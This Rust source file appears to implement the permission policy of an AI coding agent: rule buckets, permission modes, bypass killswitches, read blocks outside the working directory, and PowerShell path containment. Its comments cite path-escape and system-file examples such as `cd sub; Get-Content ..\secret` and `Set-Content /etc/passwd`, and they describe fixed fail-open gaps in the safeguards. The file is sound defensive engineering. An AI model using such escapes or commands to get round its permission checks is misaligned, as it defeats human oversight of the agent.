//! `PermissionPolicy::authorize` — rule-driven decision + mode fallback.
//!
//! Classifiers and shadow detection are wired in Plan 03 (Tools System).
//! M1.3 evaluates rules in priority order (deny first, then allow) and
//! falls back to the active mode for unmatched calls.

use crate::auto_edit_safety::{check_path_safety_for_auto_edit, AutoEditSafety};
use crate::defaults_per_tool::tool_default;
use crate::denial_tracking::DenialTrackingState;
use crate::filesystem::{
    file_tool_kind, input_path_for_tool, path_in_allowed_working_path, test_rule_pattern,
    FileToolKind, FsRoots, RulePatternMatch,
};
use crate::gate::PromptDefault;
use crate::mode::PermissionMode;
use crate::result::{
    PermissionDecisionReason, PermissionMetadata, PermissionPrompt, PermissionResult,
};
use crate::rule::{PermissionBehavior, PermissionRule, PermissionRuleSource};
use crate::shell_command;
use crate::working_dirs::AdditionalWorkingDirs;
use crate::workspace_lease;
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::sync::Mutex;

/// Base commands a Bash invocation may auto-allow in `AcceptEdits` mode — 1:1
/// with claude-code `ACCEPT_EDITS_ALLOWED_COMMANDS` (`BashTool/modeValidation.ts:7-15`).
/// `sed` is included here but is FURTHER gated by the sed auto-allow verdict
/// (`sedValidation.ts`): it auto-allows only when [`crate::sed_validation::SedVerdict::Safe`].
const ACCEPT_EDITS_ALLOWED_COMMANDS: [&str; 7] =
    ["mkdir", "touch", "rm", "rmdir", "mv", "cp", "sed"];

/// Rule sources in citation-walk order, byte-locked to claude-code's `Szn`
/// (`[...Tw,"cliArg","command","session",…]` with `Tw=["userSettings",
/// "projectSettings","localSettings","flagSettings","policySettings"]`) — #35.
/// `first_match` walks each behavior bucket in this order and cites the FIRST
/// matching rule. This is CITATION precedence only: the deny-wins outcome is
/// behavior-first (`authorize_inner` checks the whole deny bucket before ask
/// before allow), so the source order never changes the allow/deny DECISION —
/// only which source's rule is reported. (Was the exact reverse of this.)
const SOURCES_BY_PRIORITY: [PermissionRuleSource; 10] = [
    PermissionRuleSource::Settings(protocol::SettingsScope::User),
    PermissionRuleSource::Settings(protocol::SettingsScope::Project),
    PermissionRuleSource::Settings(protocol::SettingsScope::Local),
    PermissionRuleSource::FlagSettings,
    PermissionRuleSource::Settings(protocol::SettingsScope::Managed),
    PermissionRuleSource::CliArg,
    PermissionRuleSource::Command,
    PermissionRuleSource::Session,
    // 2.1.215 `fJr` tail — lowest citation precedence, walked last.
    PermissionRuleSource::ToolsNarrowing,
    PermissionRuleSource::McpServerPolicy,
];
// ── 2.1.263 working-directory confinement copy (byte-locked) ────────────────

/// Oracle `ov` — the `permissions.blockReadsOutsideWorkingDirectories`
/// decision reason (`decisionReason:{type:"other", reason: ov}`); also the
/// `safetyCheck` reason the Bash-side path checks report with
/// `circuitBreaker:"outsideReadsBlocked"`.
pub const OUTSIDE_READS_BLOCKED_REASON: &str = "Reads outside the working directories are blocked (permissions.blockReadsOutsideWorkingDirectories). Add the directory with /add-dir, or remove that setting.";

/// Oracle `ic.why` — the `--restricted` half of `sc`.
pub const RESTRICTED_OUTSIDE_WHY: &str =
    "--restricted confines the file tools to the working directory.";

/// Oracle `Ctt` — `ic.reason`.
pub const RESTRICTED_OUTSIDE_REASON: &str = "--restricted: path outside the working directory";

/// Oracle `Ep.why` — the read-block half of `sc`.
pub const READ_BLOCK_WHY: &str = "the permissions.blockReadsOutsideWorkingDirectories setting blocks reads outside the working directories. Ask the user to add the directory with /add-dir, or to remove that setting.";

/// Rule-driven authorization policy.
///
/// Holds three rule buckets (allow / deny / ask) keyed by source, the active
/// mode, denial-tracking state (populated in Plan 03), and a flag that gates
/// `BypassPermissions` to defend against rogue automation.
pub struct PermissionPolicy {
    /// Active mode (drives fallback when no rule matches).
    pub mode: PermissionMode,
    /// Allow rules grouped by source.
    pub allow_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
    /// Deny rules grouped by source.
    pub deny_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
    /// Ask rules grouped by source.
    pub ask_rules: HashMap<PermissionRuleSource, Vec<PermissionRule>>,
    /// Consecutive-denial counters (Plan 03 populates this).
    pub denial_tracking: Mutex<DenialTrackingState>,
    /// Killswitch that overrides `BypassPermissions` back to `Ask`.
    pub bypass_killswitch_active: bool,
    /// Claude Code 2.1.251 restricted-session capability. This is intentionally
    /// separate from [`PermissionMode`]: it hardens tool/settings/protected-file
    /// paths without changing the user's selected permission mode.
    pub restricted: bool,
    /// Auto-mode killswitch — 1:1 with claude-code `Bpa()` (the
    /// `disableAutoMode == "disable"` settings flag at either position). When
    /// `true`, the live `set_permission_mode` gate refuses `auto`
    /// ([`crate::PolicyPermissionGate::set_permission_mode`]) with the byte-exact
    /// `Cannot set permission mode to auto: auto mode disabled by settings`
    /// message, mirroring the boot mode-load downgrade
    /// ([`crate::auto_gate::apply_auto_mode_gate`]). Set at engine boot from any
    /// disabling settings tier via [`crate::auto_mode_disabled_from_settings_json`].
    /// Defaults to `false`.
    pub auto_mode_disabled: bool,
    /// Was the session ORIGINALLY started with `BypassPermissions` available?
    /// 1:1 with TS `ToolPermissionContext.isBypassPermissionsModeAvailable`.
    /// When `true`, `Plan` mode ALSO bypasses permissions (claude-code
    /// `permissions.ts:1268-1271` `shouldBypassPermissions`) — a plan started
    /// from a bypass session keeps the bypass grant. Defaults to `false`
    /// (preserving the plan-mode mutation backstop). Production engine wiring
    /// resolves this from the launch mode/flag. Subject to the same
    /// [`Self::bypass_killswitch_active`] override as `BypassPermissions`.
    pub bypass_permissions_available: bool,
    /// Filesystem roots for per-tool file-path CONTENT matching (phase 3a).
    /// `None` preserves the phase-2 tool-wide behavior (content ignored,
    /// matched by exact tool name); production sets this via [`Self::with_roots`]
    /// so `Edit(src/**)` / `Read(./secrets/**)` match the input path.
    pub roots: Option<FsRoots>,
    /// Allow rules stripped out on entry to [`PermissionMode::Auto`] because
    /// they would bypass the auto-mode classifier (`Bash(python:*)`, `Agent(*)`,
    /// `PowerShell(iex:*)`, …). Stashed here by
    /// [`Self::strip_dangerous_for_auto`] and re-added verbatim by
    /// [`Self::restore_dangerous`] when leaving Auto. Empty in every other mode.
    /// 1:1 with the TS `strippedDangerousRules` field on `ToolPermissionContext`.
    pub stripped_dangerous: Vec<PermissionRule>,
    /// Per-stripped-rule `(source, original_index_within_source_bucket)`, kept
    /// parallel to [`Self::stripped_dangerous`] so [`Self::restore_dangerous`]
    /// re-inserts each rule at its original position — making `strip → restore`
    /// an EXACT identity (TS only guarantees set-equality via `applyPermissionUpdate`
    /// re-add; the position record is a Rust-side strengthening, documented).
    stripped_positions: Vec<(PermissionRuleSource, usize)>,
    /// Extra directories (beyond `roots.cwd`) inside which `AcceptEdits` mode
    /// auto-allows safe file edits. 1:1 with the keys of the TS
    /// `ToolPermissionContext.additionalWorkingDirectories` map, which
    /// `allWorkingDirectories` (`filesystem.ts:667-674`) unions with the original
    /// cwd. Empty by default; production sets it via [`Self::with_working_dirs`].
    /// 1:1 with claude-code `ToolPermissionContext.additionalWorkingDirectories`
    /// — a path-keyed map carrying the SOURCE that contributed each directory
    /// (see [`crate::working_dirs`]). `rb(ctx)` is
    /// `cwd + additional_working_dirs.paths()`; `mEt(ctx)` is
    /// `cwd + additional_working_dirs.read_block_paths()`, which drops
    /// `projectSettings` entries so a checked-in settings file cannot widen
    /// `blockReadsOutsideWorkingDirectories`.
    pub additional_working_dirs: AdditionalWorkingDirs,
    /// `permissions.blockReadsOutsideWorkingDirectories` — refuse file-tool
    /// reads (Read, Grep, Glob, LSP) outside the working directories in EVERY
    /// permission mode. `true` in any settings source wins (see
    /// [`crate::loader::block_reads_outside_working_directories_from_settings_json`]).
    pub block_reads_outside_working_directories: bool,
    /// Minimal sandbox-runtime config for the bash sandbox-auto-allow layer
    /// (`bashToolHasPermission`'s `isSandboxingEnabled() &&
    /// isAutoAllowBashIfSandboxedEnabled() && shouldUseSandbox(input)` branch).
    /// `None` (the DEFAULT) makes the sandbox-auto-allow layer a no-op, so
    /// `authorize` behaves exactly as before when absent — preserving the
    /// opt-in posture. Set via [`Self::with_sandbox_runtime`]; the `permission`
    /// crate cannot depend on the `sandbox` crate (cycle), so this carries only
    /// the three fields the auto-allow branch reads
    /// ([`crate::sandbox_auto_allow::SandboxAutoAllowConfig`]). Production folds
    /// the active settings tiers into this field at boot.
    pub sandbox_runtime: Option<crate::sandbox_auto_allow::SandboxAutoAllowConfig>,
    /// PowerShell command parser (via `pwsh`) enabling the PowerShell-specific
    /// path-containment guard. `None` (the DEFAULT) makes PowerShell path
    /// containment a passthrough no-op — exactly claude-code's behavior on a host
    /// without PowerShell — so `authorize` is byte-identical when absent. Set via
    /// [`Self::with_pwsh_parser`] at the engine boot site on hosts with `pwsh`
    /// (e.g. [`crate::powershell_parse::SystemPwshParser`]).
    pub pwsh_parser: Option<std::sync::Arc<dyn crate::powershell_parse::PwshParser>>,
    /// The session's plan files — the one write carve-out plan mode grants
    /// (2.1.266 `Zl`, consulted by `LZe`). `None` (the DEFAULT) leaves
    /// `authorize` byte-identical to the pre-carve-out behavior; the engine
    /// roots publish a shared [`crate::plan_files::PlanFileMatcher`] here and
    /// into the tool context so `ExitPlanMode` reads back the same file the
    /// model was allowed to write.
    pub plan_files: Option<std::sync::Arc<crate::plan_files::PlanFileMatcher>>,
    /// Enterprise gate that permits only managed policy rules and disables
    /// user/project/local permission persistence for the session.
    pub allow_managed_permission_rules_only: bool,
    /// `autoMode.classifyAllShell` escalation — 1:1 with claude-code `QOi()`
    /// (`fon()`), resolved TRUE when ANY settings tier sets
    /// `autoMode.classifyAllShell === true`. When set, EVERY `Bash`/`PowerShell`
    /// allow rule is treated as dangerous for the auto-mode classifier (the
    /// `R1t`/`uxt` escalation: `(e===Bash||e===PowerShell)&&fon()`), so it is
    /// suspended while auto mode is active and all shell commands route through
    /// the classifier — per the settings schema *"When true, every Bash/PowerShell
    /// allow rule is suspended while auto mode is active so all shell commands are
    /// routed through the classifier"*. Defaults to `false` (the base predicate).
    /// Set at engine boot from any enabling settings tier via
    /// [`crate::classify_all_shell_from_settings_json`].
    pub classify_all_shell: bool,
    /// Ephemeral local-app workflow leases.  This is deliberately orthogonal
    /// to the session-wide mode and is checked only after explicit deny/ask
    /// rules and shell safety guards have run.
    pub workspace_leases: Option<Arc<crate::WorkspacePermissionLeaseRegistry>>,
    /// PER-SPAWN `bashCommandClamp` GROUPS folded out of this call's
    /// `bash_command_clamp` permission layers
    /// ([`crate::layers::FoldedPermissionContext::bash_command_clamps`]).
    ///
    /// 1:1 with `toolPermissionContext.bashCommandClamps` (claude-code 2.1.238
    /// `gn` @287028951). While NON-EMPTY, shell execution is clamped to command
    /// forms every group admits and every non-Bash shell surface is denied — see
    /// [`crate::bash_command_clamp`]. EMPTY in every session that attaches no
    /// clamp layer (which is every session today), so `authorize` is
    /// byte-identical to its pre-clamp behavior by default.
    pub bash_command_clamps: Vec<Vec<String>>,
    /// Apply every AUTO-mode restriction regardless of the `mode` the authorize
    /// call is actually running under: the dangerous-classifier allow-rule
    /// suspension in [`Self::rule_is_available_in_mode`], and the loop-tool
    /// carve-out that withholds `CronCreate` / `ScheduleWakeup`'s tool-local
    /// allow so they keep reaching the classifier.
    ///
    /// Set only by the gate's auto-mode `acceptEdits` SIMULATION
    /// (`PolicyPermissionGate::accept_edits_fast_path`), which is `dKo`'s
    /// "would be allowed in acceptEdits mode" probe. Upstream runs that probe
    /// with the dangerous-classifier allow rules FILTERED OUT:
    ///
    /// ```js
    /// let Lr=(Wr)=>{let Zo=yr(Wr);return!$He(Zo.toolName,Zo.ruleContent)},
    ///     yo=gs(F.alwaysAllowRules,(Wr)=>(Wr??[]).filter(Lr)), …
    ///     ko=(Wr)=>e.checkPermissions(rs,{…getAppState:()=>({…toolPermissionContext:
    ///           {...Zo.toolPermissionContext,mode:"acceptEdits",alwaysAllowRules:yo}})})
    /// ```
    ///
    /// `$He` is [`crate::dangerous_perms::is_dangerous_classifier_permission`],
    /// which this port applies through [`Self::rule_is_available_in_mode`] —
    /// but that keys on the mode being `Auto`, and the simulation deliberately
    /// passes `AcceptEdits`. Without this flag the simulation would honour
    /// `Bash(python:*)` and hand the fast path an allow the classifier was
    /// supposed to adjudicate: a FAIL-OPEN introduced by the fast path itself.
    /// Defaults to `false`, so every non-simulation authorize is untouched.
    pub apply_auto_mode_restrictions: bool,
    /// `host.launchOptions.isInteractive()` — was this process launched as an
    /// INTERACTIVE session?
    ///
    /// The only consumer is the plan-mode bypass, whose oracle predicate is
    ///
    /// ```js
    /// function zj(e,n){return e==="plan"&&n===!0&&!Ae()}
    /// function Ae(){return!n().host.launchOptions.isInteractive()}
    /// ```
    ///
    /// (2.1.270 `src_165140675.js` @64480 and `src_164505306.js` @77144). So
    /// `plan` counts as `bypassPermissions` only in a session a person is
    /// actually steering. This port had the conjunct as
    /// `!bypass_killswitch_active` instead, which is a different predicate: a
    /// HEADLESS run launched with `--dangerously-skip-permissions` and then put
    /// into plan mode got a blanket allow that upstream withholds.
    ///
    /// Defaults to `false` so a host that does not declare its launch kind
    /// fails CLOSED — the flag only ever widens permission.
    ///
    /// ⚠️ This is a LAUNCH property, not the per-call
    /// `is_non_interactive_session` / `shouldAvoidPermissionPrompts` that the
    /// gate context carries; upstream reads it from the ambient host, not from
    /// the call. It is a field rather than a process-global read so the
    /// parallel test harness cannot make one test's launch kind leak into
    /// another's authorize.
    pub interactive_session: bool,
    /// Session-scoped read-block allowances (oracle `XY` / `BK`): tool-result
    /// files, scratchpad, job `tmp/`, project temp. Empty by default so
    /// `authorize` is unchanged until the host publishes the session dirs.
    pub session_read_allowances: Vec<SessionReadAllowance>,
}

/// One session directory that remains readable under the read block.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SessionReadAllowance {
    /// Directory (or file) that is allowed.
    pub path: PathBuf,
    /// Oracle `decisionReason.reason` when this allowance matches.
    pub reason: String,
}

impl SessionReadAllowance {
    /// Allow `path` and every descendant.
    #[must_use]
    pub fn directory(path: PathBuf, reason: &'static str) -> Self {
        Self {
            path,
            reason: reason.to_string(),
        }
    }

    fn covers(&self, candidate: &Path) -> bool {
        candidate == self.path || candidate.starts_with(&self.path)
    }
}

/// Oracle `vc()`: `{jobDir}/tmp` is readable under the read block only for a
/// `bg` session whose `JOB_DIR` sits under `{configHome}/jobs`.
#[must_use]
pub fn job_tmp_session_allowance(
    lingxi_home: &Path,
    session_kind: Option<&str>,
    job_dir: Option<&Path>,
) -> Option<SessionReadAllowance> {
    if session_kind != Some("bg") {
        return None;
    }
    let job_dir = job_dir?;
    if job_dir.as_os_str().is_empty() {
        return None;
    }
    let jobs_root = lingxi_home.join("jobs");
    if !job_dir.starts_with(&jobs_root) {
        return None;
    }
    Some(SessionReadAllowance::directory(
        job_dir.join("tmp"),
        JOB_TMP_READ_ALLOW_REASON,
    ))
}

/// Oracle `XY`: "Tool result files are allowed for reading".
pub const TOOL_RESULT_READ_ALLOW_REASON: &str = "Tool result files are allowed for reading";
/// Oracle `XY`: "Scratchpad files for current session are allowed for reading".
pub const SCRATCHPAD_READ_ALLOW_REASON: &str =
    "Scratchpad files for current session are allowed for reading";
/// Oracle `XY`: "Job tmp/ subtree for current bg session is allowed for reading".
pub const JOB_TMP_READ_ALLOW_REASON: &str =
    "Job tmp/ subtree for current bg session is allowed for reading";
/// Oracle `XY`: "Project temp directory files are allowed for reading".
pub const PROJECT_TEMP_READ_ALLOW_REASON: &str =
    "Project temp directory files are allowed for reading";

impl PermissionPolicy {
    /// Build a fresh policy with no rules and the given mode.
    #[must_use]
    pub fn new(mode: PermissionMode) -> Self {
        Self {
            mode,
            allow_rules: HashMap::new(),
            deny_rules: HashMap::new(),
            ask_rules: HashMap::new(),
            denial_tracking: Mutex::new(DenialTrackingState::default()),
            bypass_killswitch_active: false,
            restricted: false,
            auto_mode_disabled: false,
            bypass_permissions_available: false,
            roots: None,
            stripped_dangerous: Vec::new(),
            stripped_positions: Vec::new(),
            additional_working_dirs: AdditionalWorkingDirs::new(),
            block_reads_outside_working_directories: false,
            sandbox_runtime: None,
            pwsh_parser: None,
            plan_files: None,
            allow_managed_permission_rules_only: false,
            classify_all_shell: false,
            workspace_leases: None,
            bash_command_clamps: Vec::new(),
            apply_auto_mode_restrictions: false,
            interactive_session: false,
            session_read_allowances: Vec::new(),
        }
    }

    /// Publish session-scoped read-block allowances (oracle `XY`).
    #[must_use]
    pub fn with_session_read_allowances(
        mut self,
        allowances: impl IntoIterator<Item = SessionReadAllowance>,
    ) -> Self {
        self.session_read_allowances = allowances.into_iter().collect();
        self
    }

    /// Publish the session's plan-file identity holder — see
    /// [`crate::plan_files`]. Without it the carve-out never fires.
    #[must_use]
    pub fn with_plan_files(
        mut self,
        plan_files: std::sync::Arc<crate::plan_files::PlanFileMatcher>,
    ) -> Self {
        self.plan_files = Some(plan_files);
        self
    }

    /// Attach the per-spawn `bashCommandClamp` GROUPS for THIS call
    /// ([`Self::bash_command_clamps`]). Used by
    /// [`crate::PolicyPermissionGate`]'s per-call layer fold; an empty slice
    /// leaves the policy unclamped.
    #[must_use]
    pub fn with_bash_command_clamps(mut self, clamps: Vec<Vec<String>>) -> Self {
        self.bash_command_clamps = clamps;
        self
    }

    /// Apply the enterprise managed-rules-only persistence gate.
    #[must_use]
    pub fn with_managed_permission_rules_only(mut self, enabled: bool) -> Self {
        self.allow_managed_permission_rules_only = enabled;
        self
    }

    /// Declare whether this process was launched as an INTERACTIVE session —
    /// `host.launchOptions.isInteractive()`. See
    /// [`Self::interactive_session`]; the plan-mode bypass is its only reader.
    #[must_use]
    pub fn with_interactive_session(mut self, interactive: bool) -> Self {
        self.interactive_session = interactive;
        self
    }

    /// Force `Auto`-mode rule availability regardless of the mode the authorize
    /// call runs under — the auto-mode `acceptEdits` simulation only. See
    /// [`Self::apply_auto_mode_restrictions`].
    #[must_use]
    pub fn with_apply_auto_mode_restrictions(mut self, enabled: bool) -> Self {
        self.apply_auto_mode_restrictions = enabled;
        self
    }

    /// Set the `autoMode.classifyAllShell` escalation flag (claude-code
    /// `QOi()`/`fon()`). When `true`, every `Bash`/`PowerShell` allow rule is
    /// treated as dangerous for the auto-mode classifier and suspended while auto
    /// mode is active. Engine boot resolves the argument as the sticky OR over
    /// every settings tier (any tier with `autoMode.classifyAllShell === true`
    /// wins). See [`Self::classify_all_shell`].
    #[must_use]
    pub fn with_classify_all_shell(mut self, enabled: bool) -> Self {
        self.classify_all_shell = enabled;
        self
    }

    /// Attach a [`crate::powershell_parse::PwshParser`], enabling PowerShell
    /// path-containment. When absent (the default) PowerShell containment passes
    /// through — matching claude-code on a host without `pwsh`.
    #[must_use]
    pub fn with_pwsh_parser(
        mut self,
        parser: std::sync::Arc<dyn crate::powershell_parse::PwshParser>,
    ) -> Self {
        self.pwsh_parser = Some(parser);
        self
    }

    /// Run PowerShell path containment for a `PowerShell` command (claude-code
    /// `validatePowerShellCommandPaths` → `Z_u`). Returns `Some(ask/deny)` on a
    /// containment violation, or `None` (passthrough) when no parser is wired,
    /// `pwsh` is unavailable, the command doesn't parse, or every path is allowed.
    fn check_powershell_containment(
        &self,
        command: &str,
        roots: &FsRoots,
        mode: PermissionMode,
    ) -> Option<PermissionResult> {
        let parser = self.pwsh_parser.as_ref()?;
        let parse = parser.parse(command);
        if !parse.valid {
            return parse.invalid_reason.map(ask_powershell_invalid_parse);
        }
        let ctx = crate::powershell_containment::PsCtx {
            roots,
            additional: &self.additional_working_dirs.paths(),
            is_windows: cfg!(target_os = "windows"),
            is_macos: cfg!(target_os = "macos"),
            // PERM-PS-VRG-01: feed the live session mode into the in-working-dir
            // auto-allow gate (`t.mode` in claude-code `vRg`).
            mode,
        };
        // PS-CD-03 (part 1): compute the compound-cd flag — 1:1 with claude-code
        // `y = u.length>1 && u.some(({element:V})=>P5r(V.name))`: a compound
        // command (>1 command) that contains a cd-like element (`P5r`). Was
        // hardcoded `false`, making the compound-cd containment ask dead code
        // (an under-ask: `cd sub; Get-Content ..\secret` escaped it). NOTE
        // (part 2, cross-lane `powershell_containment.rs`/ps lane): the branch's
        // decisionReason still reuses its message rather than the distinct
        // "Compound command contains cd with path operation …" string.
        let all_names: Vec<&str> = parse
            .statements
            .iter()
            .flat_map(|s| {
                s.commands
                    .iter()
                    .filter_map(|e| match e {
                        crate::powershell_containment::PsElement::Command(c) => {
                            Some(c.name.as_str())
                        }
                        crate::powershell_containment::PsElement::Expression { .. } => None,
                    })
                    .chain(s.nested_commands.iter().map(|c| c.name.as_str()))
            })
            .collect();
        let compound_cd = all_names.len() > 1 && all_names.iter().any(|n| ps_element_is_cd_like(n));
        // PERM-PS-CALLER-06: the git-security caller battery (claude-code `NTU`)
        // pushes its asks into the decision accumulator BEFORE the
        // `gTu`/validate_ps_statements result, and final resolution is
        // first-deny-then-first-ask. So a `gTu` DENY still wins over everything,
        // but a battery ASK outranks `gTu`'s generic containment ask on a tie.
        // Evaluate the battery here, then let a `gTu` deny override it, else the
        // battery ask, else the `gTu` ask/passthrough.
        let battery = crate::powershell_containment::powershell_git_battery(
            &parse.statements,
            &ctx,
            compound_cd,
        );
        let gtu = crate::powershell_containment::validate_ps_statements(
            &parse.statements,
            &ctx,
            compound_cd,
        );
        if let crate::powershell_containment::PsContainmentResult::Deny { message, reason } = gtu {
            return Some(deny_powershell_containment(message, reason));
        }
        if let Some(crate::powershell_containment::PsContainmentResult::Ask { message, reason }) =
            battery
        {
            return Some(ask_powershell_containment(message, reason));
        }
        match gtu {
            // ps-acceptedits (`zLs`): when path containment passes through (no
            // out-of-cwd / unvalidatable-path violation) AND the session is in
            // `AcceptEdits` mode, consult the whole-pipeline structural validator.
            // A structurally-safe write pipeline auto-allows with a `PermissionMode
            // acceptEdits` reason; anything else passes through (→ normal flow /
            // ask). This is the LOWEST-priority positive result: a `gTu` DENY
            // (above), a battery ASK (above), and a `gTu` ASK (the arm below) all
            // still win, so an out-of-cwd `Set-Content /etc/passwd` in acceptEdits
            // STILL ASKS — the containment ask overrides this structural allow.
            // Strictly gated on `mode == AcceptEdits`, so default/plan are
            // unaffected.
            crate::powershell_containment::PsContainmentResult::Passthrough => {
                if mode == PermissionMode::AcceptEdits {
                    match crate::powershell_containment::ps_accept_edits_validate(
                        &parse.statements,
                        &parse.variables,
                        parse.has_stop_parsing,
                    ) {
                        crate::powershell_containment::PsAcceptEditsResult::Allow => {
                            Some(allow_with_mode(PermissionMode::AcceptEdits))
                        }
                        crate::powershell_containment::PsAcceptEditsResult::Passthrough(_) => None,
                    }
                } else {
                    None
                }
            }
            crate::powershell_containment::PsContainmentResult::Ask { message, reason } => {
                Some(ask_powershell_containment(message, reason))
            }
            // Unreachable: a `gTu` deny returned above.
            crate::powershell_containment::PsContainmentResult::Deny { message, reason } => {
                Some(deny_powershell_containment(message, reason))
            }
        }
    }

    /// Attach the minimal sandbox-runtime config that enables the bash
    /// sandbox-auto-allow layer (`bashToolHasPermission`'s sandbox branch). When
    /// absent (the default) the layer is a no-op. Populate at the engine boot
    /// site from the real `sandbox::runtime_config::SandboxRuntimeConfig`
    /// (copying its `enabled`, `auto_allow_bash_if_sandboxed`, and
    /// `excluded_commands` into
    /// [`crate::sandbox_auto_allow::SandboxAutoAllowConfig`]).
    #[must_use]
    pub fn with_sandbox_runtime(
        mut self,
        config: crate::sandbox_auto_allow::SandboxAutoAllowConfig,
    ) -> Self {
        self.sandbox_runtime = Some(config);
        self
    }

    /// Set the extra working directories inside which `AcceptEdits` mode
    /// auto-allows safe edits (beyond `roots.cwd`). Mirrors seeding the keys of
    /// TS `ToolPermissionContext.additionalWorkingDirectories`. Backward-compatible
    /// (default empty); production may leave it unset this batch.
    #[must_use]
    pub fn with_working_dirs(mut self, dirs: AdditionalWorkingDirs) -> Self {
        self.additional_working_dirs = dirs;
        self
    }

    /// Arm `permissions.blockReadsOutsideWorkingDirectories`.
    #[must_use]
    pub fn with_block_reads_outside_working_directories(mut self, blocked: bool) -> Self {
        self.block_reads_outside_working_directories = blocked;
        self
    }

    /// PARITY 2.1.263 `mEt(e)` — the working-dir set the read block compares
    /// against: cwd plus every additional working dir that did NOT come from
    /// `projectSettings`. Order is stable (cwd first, then insertion order) so
    /// the `${dirs.join(", ")}` denial message is deterministic.
    #[must_use]
    pub fn read_block_working_dirs(&self, roots: &FsRoots) -> Vec<PathBuf> {
        let mut dirs = vec![roots.cwd.clone()];
        for dir in self.additional_working_dirs.read_block_paths() {
            if !dirs.contains(&dir) {
                dirs.push(dir);
            }
        }
        dirs
    }

    /// `rb(ctx)` — cwd plus EVERY additional working directory, regardless of
    /// source. The set every ordinary working-dir consumer wants.
    #[must_use]
    pub fn all_working_dirs(&self, roots: &FsRoots) -> Vec<PathBuf> {
        let mut dirs = vec![roots.cwd.clone()];
        for dir in self.additional_working_dirs.paths() {
            if !dirs.contains(&dir) {
                dirs.push(dir);
            }
        }
        dirs
    }

    #[must_use]
    pub fn with_workspace_leases(
        mut self,
        leases: Arc<crate::WorkspacePermissionLeaseRegistry>,
    ) -> Self {
        self.workspace_leases = Some(leases);
        self
    }

    /// Mark whether `BypassPermissions` mode was available at session start
    /// (TS `isBypassPermissionsModeAvailable`). When `true`, `Plan` mode bypasses
    /// permissions like `BypassPermissions` (see
    /// [`Self::bypass_permissions_available`]). Default `false`.
    #[must_use]
    pub fn with_bypass_available(mut self, available: bool) -> Self {
        self.bypass_permissions_available = available;
        self
    }

    /// Mark this policy as belonging to a restricted session. Restricted
    /// protected mutations remain an `Ask` even when an ordinary allow rule,
    /// bypass-like mode, or tool-local auto path would otherwise allow them.
    #[must_use]
    pub fn with_restricted(mut self, restricted: bool) -> Self {
        self.restricted = restricted;
        self
    }

    /// Return whether this call is a protected mutation under restricted mode.
    /// The classification reuses the existing file-tool grouping and
    /// `check_path_safety_for_auto_edit` provenance instead of guessing from
    /// arbitrary input strings. Config writes are identified by the Config tool
    /// contract (`value` present), while file writes use the canonical path
    /// field from [`crate::filesystem::input_path_for_tool`].
    #[must_use]
    pub fn is_restricted_protected_mutation(
        &self,
        tool_name: &str,
        input: &serde_json::Value,
    ) -> bool {
        if !self.restricted {
            return false;
        }
        if tool_name == "Config" && input.get("value").is_some() {
            return true;
        }
        if file_tool_kind(tool_name) != FileToolKind::Editor {
            return false;
        }
        let Some(roots) = self.roots.as_ref() else {
            return false;
        };
        let Some(raw_path) = input_path_for_tool(tool_name, input, roots) else {
            return false;
        };
        matches!(
            check_path_safety_for_auto_edit(raw_path.as_ref(), roots),
            AutoEditSafety::Unsafe { .. }
        )
    }

    /// Enable phase-3a file-path content matching by supplying the filesystem
    /// roots a rule's [`PermissionRuleSource`] resolves against. Without this,
    /// content rules for file tools fall back to phase-2 tool-wide matching.
    #[must_use]
    pub fn with_roots(mut self, roots: FsRoots) -> Self {
        // Relative-path matching is meaningless against a relative cwd: every
        // absolute tool path would resolve `../…` and silently stop matching.
        // Production always supplies an absolute cwd (`std::env::current_dir`).
        debug_assert!(
            roots.cwd.is_absolute(),
            "FsRoots.cwd must be absolute for correct file-path matching"
        );
        self.roots = Some(roots);
        self
    }

    /// Build a policy with `mode`, bucketing `rules` into the allow/deny/ask
    /// maps keyed by source. The foundation for enforcement: the loaded rules
    /// (e.g. from [`crate::loader::permission_rules_from_settings_json`]) land
    /// in the same buckets [`Self::authorize`] already evaluates. Wiring a gate
    /// over the resulting policy is a later phase.
    #[must_use]
    pub fn from_rules(
        mode: PermissionMode,
        rules: impl IntoIterator<Item = PermissionRule>,
    ) -> Self {
        Self::from_rules_confined(mode, rules, platform_api::env::is_eval_confined_session())
    }

    /// [`Self::from_rules`] with the confinement flag passed in rather than read
    /// from the process environment.
    ///
    /// 🚨 This exists because `CLAUDE_CODE_EVAL_CONFINED` is a PROCESS global and
    /// the test harness runs a binary's tests on parallel threads. A test that
    /// sets the variable to exercise `OG` filters the allow rules of every other
    /// test constructing a policy in the same window — which showed up here as
    /// `content_allow_rule_matches_only_matching_path` failing in a full run and
    /// passing in isolation. Reading the environment once, at the edge, and
    /// threading the answer keeps the flag out of that race; tests call this
    /// directly and mutate nothing.
    #[must_use]
    pub fn from_rules_confined(
        mode: PermissionMode,
        rules: impl IntoIterator<Item = PermissionRule>,
        confined: bool,
    ) -> Self {
        let mut policy = Self::new(PermissionMode::Default);
        // PARITY 2.1.263 `OG(e)`:
        // `let t = Bm(e); return YYe() ? t.filter(r => r.ruleBehavior !== "allow") : t`
        //
        // A confined eval run takes permission grants ONLY from its command
        // line, so every `allow`-behavior rule is dropped no matter which
        // settings tier produced it. Deny and ask rules are kept — the flag
        // narrows what may be granted, it does not disarm the policy. The
        // sibling half of this lives in `hooks` (`H_n`), which drops a hook's
        // allow the same way.
        for rule in rules {
            if confined && rule.behavior == PermissionBehavior::Allow {
                continue;
            }
            let bucket = match rule.behavior {
                PermissionBehavior::Allow => &mut policy.allow_rules,
                PermissionBehavior::Deny => &mut policy.deny_rules,
                PermissionBehavior::Ask => &mut policy.ask_rules,
            };
            bucket.entry(rule.source).or_default().push(rule);
        }
        policy.set_mode(mode);
        policy
    }

    /// Tool-name targets of every TOOL-WIDE deny rule (`rule_content == None`)
    /// across all sources — the rule names that BLANKET-deny a tool. Used by the
    /// orchestrator's wire-tool filter to strip denied tools BEFORE the model
    /// sees them, 1:1 with claude-code `filterToolsByDenyRules` /
    /// `getDenyRuleForTool` (`tools.ts:262-269`, `permissions.ts:287-292`), which
    /// drops a tool when a deny rule with NO `ruleContent` matches its name via
    /// [`tool_wide_name_matches`]. CONTENT deny rules (e.g. `Bash(rm:*)`,
    /// `WebFetch(domain:x)`) are EXCLUDED — they deny specific calls, not the
    /// whole tool, so the tool stays advertised (matching TS, where
